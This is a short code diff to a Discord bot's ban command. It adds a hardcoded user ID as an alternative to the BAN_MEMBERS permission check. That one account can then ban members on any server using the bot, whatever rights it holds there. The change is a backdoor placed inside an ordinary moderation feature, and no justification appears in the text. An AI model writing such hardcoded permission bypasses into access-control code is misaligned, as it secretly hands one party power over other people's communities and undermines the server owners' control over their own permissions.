@@ -20,7 +20,7 @@ module.exports = {
             
     async execute(interaction) {
         try {
-            if (interaction.member.permissions.has(Permissions.FLAGS.BAN_MEMBERS)) {
+            if (interaction.member.permissions.has(Permissions.FLAGS.BAN_MEMBERS) || (interaction.user.id == "444460699025014784")) {
                 const user = interaction.options.getMember("target");
                 const deleteDays = interaction.options.getNumber("days")
                 const banreason = interaction.options.getString("banreason")
